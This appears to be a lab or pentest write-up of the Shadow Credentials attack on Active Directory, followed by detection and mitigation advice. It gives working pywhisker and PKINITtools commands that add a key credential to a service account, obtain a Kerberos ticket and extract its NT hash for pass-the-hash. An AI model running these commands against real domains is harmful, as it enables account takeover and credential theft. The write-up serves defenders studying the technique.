# Shadow Credentials: Taking Over AD Accounts Without Password Resets

**Date:** October 2024  
**Environment:** Windows Server 2019 AD with PKINIT enabled  
**Technique:** Shadow Credentials via msDS-KeyCredentialLink manipulation

## Overview

The Shadow Credentials technique, published by Elad Shamir, allows an attacker to take over Active Directory accounts by writing their own public key to the `msDS-KeyCredentialLink` attribute. This enables authentication via PKINIT (Public Key Cryptography for Initial Authentication in Kerberos) without knowing or resetting the target's password — making it significantly stealthier than traditional password reset attacks.

## The Attack

### Step 1: Identify Write Access

Using BloodHound, we identified that our compromised user had `AddKeyCredentialLink` permissions on a privileged service account (`svc_sql`):

```bash
# Check existing key credentials
pywhisker.py -d "corp.local" -u "attacker" -p "Passw0rd!" \
    --target "svc_sql" --action "list"
```

### Step 2: Add a Shadow Credential

We generated a new key pair and wrote it to the target's `msDS-KeyCredentialLink`:

```bash
pywhisker.py -d "corp.local" -u "attacker" -p "Passw0rd!" \
    --target "svc_sql" --action "add" --filename svc_sql_shadow
```

This produced `svc_sql_shadow.pfx` — a certificate we control that's now registered for the target account.

### Step 3: Authenticate via PKINIT

Using PKINITtools, we obtained a Kerberos TGT for the target:

```bash
gettgtpkinit.py -cert-pfx svc_sql_shadow.pfx -pfx-pass "shadow123" \
    corp.local/svc_sql@CORP.LOCAL
```

### Step 4: Extract the NT Hash

From the TGT, we extracted the target's NT hash:

```bash
python3 getnthash.py CORP.LOCAL/svc_sql@CORP.LOCAL
```

With the NT hash, we could perform Pass-the-Hash attacks or further lateral movement.

## Why This Is Stealthy

Unlike password reset attacks, Shadow Credentials:
- Don't change the target's password (no disruption)
- Don't trigger password change alerts
- Don't lock out the legitimate user
- Leave minimal forensic artifacts

The only evidence is a new entry in the `msDS-KeyCredentialLink` attribute, which is rarely monitored.

## Detection

To detect Shadow Credential attacks:

1. **Monitor attribute changes:** Alert on modifications to `msDS-KeyCredentialLink`
   ```powershell
   Get-WinEvent -FilterHashtable @{LogName='Directory Service'; ID=5136} |
       Where-Object { $_.Properties[6].Value -like '*msDS-KeyCredentialLink*' }
   ```

2. **Regular audits:** Periodically scan for unexpected key credentials
   ```bash
   pywhisker.py -d "corp.local" -u "admin" -p "password" \
       --target "all_users" --action "list"
   ```

3. **BloodHound monitoring:** Track changes to `AddKeyCredentialLink` permissions

## Mitigation

1. **Least privilege:** Remove unnecessary `AddKeyCredentialLink` permissions
2. **Protected Users group:** Add critical accounts to the Protected Users group
3. **Monitor key credential changes:** Implement alerting for `msDS-KeyCredentialLink` modifications
4. **Regular ACL audits:** Use BloodHound to identify risky permission paths

## Tools Used

- [pyWhisker](https://github.com/ShutdownRepo/pywhisker) - Python implementation of Shadow Credentials
- [PKINITtools](https://github.com/dirkjanm/PKINITtools) - PKINIT authentication utilities
- [BloodHound](https://github.com/BloodHoundAD/BloodHound) - AD attack path analysis